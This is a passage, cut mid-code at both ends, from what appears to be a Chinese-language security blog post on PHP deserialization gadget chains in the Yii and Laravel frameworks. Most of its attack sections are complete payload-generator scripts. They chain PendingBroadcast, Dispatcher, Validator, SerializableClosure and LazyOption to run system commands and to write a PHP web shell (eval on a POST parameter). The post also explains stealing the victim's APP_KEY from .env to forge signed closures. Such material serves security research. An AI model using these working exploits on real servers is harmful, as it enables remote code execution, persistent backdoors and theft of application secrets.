punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>遇到没有回显的，或者不知道是否执行的命令执行，可以尝试<strong>DNS外带或者写本地文件</strong></p><h2 id="Laravel框架"><a href="#Laravel框架" class="headerlink" title="Laravel框架"></a>Laravel框架</h2><p>laravel框架分析</p><p>路由：routes&#x2F;web.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$router</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/server/editer'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'EditorController@main'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#意思是访问/server/editer会进入到EditorController.php(控制器)中的main函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>控制器Http&#x2F;controllers&#x2F;EditorController.php</p><h3 id="链一（8-5-9-x2F-5-8-x）"><a href="#链一（8-5-9-x2F-5-8-x）" class="headerlink" title="链一（8.5.9&#x2F;5.8.x）"></a>链一（8.5.9&#x2F;5.8.x）</h3><p><strong>寻找__destruct</strong></p><p>入口类为：<code>\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php</code>的<code>class PendingBroadcast</code></p><p>这是一个很经典的入口类了，如果读者有研究Laravel 5的反序列化链，可能会知道这个类。其<code>__destruct</code>方法：</p><p><img src="https://pic4.zhimg.com/80/v2-49be6c5edea33d1c124f7efe7c5ba443_720w.png" alt="img"></p><p>我们可以控制<code>$this-&gt;events</code>和<code>$this-&gt;event</code>。<strong>如果使<code>$this-&gt;events</code>为某个拥有dispatch方法的类</strong>，我们可以调用这个类的dispatch方法。</p><p><strong>寻找dispatch方法</strong></p><p><code>\vendor\laravel\framework\src\Illuminate\Bus\Dispatcher.php</code>的<code>class Dispatcher</code>存在dispatch方法</p><p><img src="https://pic2.zhimg.com/80/v2-f4548eaf94aac957dec1e75d834392b9_720w.png" alt="img"></p><p><code>$command</code>可控，<code>$this-&gt;queueResolver</code>可控，<code>$this-&gt;commandShouldBeQueued</code><strong>要求<code>$command</code>为ShouldQueue的实例</strong></p><p><img src="https://pic2.zhimg.com/80/v2-8d1ca24f394ff998706efcd90a374d11_720w.png" alt="img"></p><p>全局搜索，随便找一个ShouldQueue的子类即可</p><p><img src="https://pic4.zhimg.com/80/v2-4e7ebfdc1fd9350d66642291c6f340bb_720w.png" alt="img"></p><p>然后就能够进入<code>$this-&gt;dispatchToQueue</code>方法</p><p><img src="https://pic4.zhimg.com/80/v2-94ba149945201e91d589cf3c1367dc0f_720w.png" alt="img"></p><p><code>$this-&gt;queueResolver</code>和<code>$connection</code>均可控。payload如下：</p><p>构造payload是要注意，<font color="pink">加上类的命名空间</font>很重要</p><p><strong>类实例化时也要加上命名空间</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 1.php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BroadcastEvent</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span><span class="token comment">//可以自己添加属性</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>BroadcastEvent</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>加强</strong></p><p>上面的利用方法中，执行<code>call_user_func($this-&gt;queueResolver, $connection);</code>时，执行的函数只有<code>$connection</code>一个参数。如果现在需要执行一个多参数函数比如file_put_contents就没办法了。</p><p>注意到这里call_user_func的第一个参数除了可以是函数名字符串，还有两种可以利用方式：</p><ol><li>使第一个参数为一个类，就能调用该类的<code>__invoke</code>方法</li><li>使第一个参数为数组，例如<code>[class A, &#39;foo&#39;]</code>，表示调用类A的foo方法。下面分别介绍这两种方式例子</li></ol><p><strong>法一：调用__invoke</strong></p><p>这里的利用稍为复杂</p><p>在<code>\vendor\opis\closure\src\SerializableClosure.php</code>的<code>class SerializableClosure</code>找到了一个非常漂亮的<code>__invoke</code>函数</p><p><img src="https://pic4.zhimg.com/80/v2-9244834a318511e00c891c932d43765b_720w.png" alt="img"></p><p>这里的<code>$this-&gt;closure</code>和<code>func_get_args()</code>均可控，我本来以为能够直接RCE了，然而后面还有两个棘手的问题。</p><p>一个是该类使用的不是标准序列化反序列化方法，而是实现了自己的序列化和反序列化方法：</p><p><img src="https://pic3.zhimg.com/80/v2-0651345eba4097ddb543add0e64a0bde_720w.png" alt="img"></p><p><img src="https://pic1.zhimg.com/80/v2-94ed908e9ed994a8889386bd2352c49c_720w.jpg" alt="img"></p><p>其实这个问题不难解决，我们可以在生成payload的时候，使用composer引入该组件：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">composer require opis/closure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在生成payload的代码中加入：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">require "./vendor/autoload.php";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">$func = function()&#123;file_put_contents("shell.php", "&lt;?php eval(\$_POST['Dig2']) ?>");&#125;;$d = new \Opis\Closure\SerializableClosure($func);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>就能生成该类实例了</p><p>第二个棘手的问题在于，Laravel 8和Laravel 5有一个区别。Laravel 8在序列化和反序列化该类时，使用了验证secret。</p><p><img src="https://pic3.zhimg.com/80/v2-05baedb87eb61e8d32bf5c71d7f8672a_720w.png" alt="img"></p><p><img src="https://pic4.zhimg.com/80/v2-8d079bd1131044028a85aa3bb095c55f_720w.png" alt="img"></p><p>该secret由环境变量配置文件，也就是<code>.env</code>中的<code>APP_KEY</code>决定，Laravel安装的时候，会在<code>.env</code>文件中生成一个随机的<code>APP_KEY</code>，例如：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">APP_KEY=base64:2qnzxAY/QWHh/1F174Qsa+8LkuMoxOCU9qN6K8KipI0=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们在本地生成payload的时候，也要手动生成一个<code>static::$securityProvider</code>，并且secret和远程受害者要是一样的才行。方法为，在本地的<code>class SerializableClosure</code>的源码<code>SerializableClosure.php</code>文件中加入这么一行(字符串为受害机<code>.env</code>文件中的密钥)：</p><p><img src="https://pic3.zhimg.com/80/v2-5f263b8128d30d11a56cad51a6e7c43e_720w.png" alt="img"></p><p>那么如何获取受害机的<code>APP_KEY</code>呢？我们在上面既然实现了单参数的任意函数执行，那么<code>file_get_content(&#39;.env&#39;)</code>就行了。当然，如果有其他漏洞点能够泄露配置文件就更方便了。</p><p>综上所述，生成payload脚本：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 1-1.php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BroadcastEvent</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span> <span class="token string double-quoted-string">"./vendor/autoload.php"</span><span class="token punctuation">;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php eval(\$_POST['Dig2']) ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Opis<span class="token punctuation">\</span>Closure<span class="token punctuation">\</span>SerializableClosure</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>BroadcastEvent</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>法二：调用另一个类某可控函数</strong></p><p>这里使用了<a href="https://link.zhihu.com/?target=https://blog.szfszf.top/">JrXnm</a>师傅在其文章<a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/189718%23h3-2">Laravel 5.8 RCE POP链汇总分析</a>中提到的方法，使用<code>vendor\phpoption\phpoption\src\PhpOption\LazyOption.php</code>的<code>class LazyOption</code>，在下面链二的加强中演示。payload一并放在文末的github地址中。</p><h3 id="链二（8-5-9-x2F-5-8-x）"><a href="#链二（8-5-9-x2F-5-8-x）" class="headerlink" title="链二（8.5.9&#x2F;5.8.x）"></a>链二（8.5.9&#x2F;5.8.x）</h3><p><strong>寻找__destruct</strong></p><p>同链一，入口类为：<code>\vendor\laravel\framework\src\Illuminate\Broadcasting\PendingBroadcast.php</code>的<code>class PendingBroadcast</code></p><p><img src="https://pic1.zhimg.com/80/v2-c4a5bfe1c28ce7ed34ea189f72fc8714_720w.png" alt="img"></p><p>我们可以控制<code>$this-&gt;events</code>和<code>$this-&gt;event</code>。如果使<code>$this-&gt;events</code>为某个类，并且该类没有实现dispatch方法却有<code>__call</code>方法，那么就可以调用这个<code>__call</code>方法了</p><p><strong>寻找__call</strong></p><p>随后找到位于<code>\vendor\laravel\framework\src\Illuminate\Validation\Validator.php</code>中的<code>class Validator</code></p><p>它有<code>__call</code>方法：</p><p><img src="https://pic3.zhimg.com/80/v2-317d346263ef551a57661d2e4ab633aa_720w.jpg" alt="img"></p><p><code>$parameters</code>可控，<code>$method</code>为固定字符串dispatch，取<code>substr($method, 8)</code>后，为空字符串，故<code>$rule</code>为<code>&#39;&#39;</code>。<code>$this-&gt;extensions</code>可控，跟踪<code>$this-&gt;callExtension()</code>方法</p><p><img src="https://pic1.zhimg.com/80/v2-43187c3118dad6b69f02bc962830e9ac_720w.jpg" alt="img"></p><p><code>$callback</code>和<code>$parameters</code>都是可控的，于是一条利用链就出来了。payload如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token comment">#protected 要用__construct进行构造</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span><span class="token variable">$event</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span><span class="token operator">=</span><span class="token variable">$event</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span><span class="token operator">=</span><span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Validation</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Validator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$extensions</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token operator">=></span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">#__call函数中 $method =》 dispatch</span>    <span class="token comment">#$parameters =》 $event</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$validator</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Validation<span class="token punctuation">\</span>Validator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingBroadcast</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$validator</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingBroadcast</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>加强</strong></p><p>对于链二的总结就是：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">$callback(... array_values($parameters));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$callback</code>可控，<code>$parameters</code>最多只能为单成员的数组。所以这里也具有无法执行多参数函数比如<code>file_put_contents</code>的问题。</p><p>注意到这里利用的是PHP中的可变函数，经过实验，如下代码可行：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"invoke"</span><span class="token operator">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"test"</span><span class="token operator">.</span><span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$callback1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span><span class="token variable">$callback1</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出invoke</span><span class="token variable">$callback2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$callback2</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出test</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用A类中的test函数</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#返回是真</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，可以控制上面利用链中的<code>$callback</code>为数组，就可以调用某其他类任意函数了。</p><p><code>vendor\phpoption\phpoption\src\PhpOption\LazyOption.php</code>的<code>class LazyOption</code>是一个很好的选择。</p><p>其option方法可以调用call_user_func_array函数，且两个参数都可控</p><p>把extension</p><p><img src="https://pic4.zhimg.com/80/v2-49bdf2d7826da1979a58bd64e5a9101f_720w.png" alt="img"></p><p>虽然option是private属性的方法，在其它类中无法直接调用，但是可以发现在该类自身中，许多函数都在调用option函数</p><p><img src="https://pic1.zhimg.com/80/v2-b56bfabff43f28af616378fa65beff00_720w.jpg" alt="img"></p><p>于是构造成功，payload如下所示</p><p>会报错但是不用管了，已经写了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 2-1.php</span><span class="token keyword">namespace</span> <span class="token package">PhpOption</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">LazyOption</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$arguments</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span> <span class="token operator">=</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arguments</span> <span class="token operator">=</span> <span class="token variable">$arguments</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Validation</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Validator</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$extensions</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$extensions</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">extensions</span> <span class="token operator">=</span> <span class="token variable">$extensions</span><span class="token 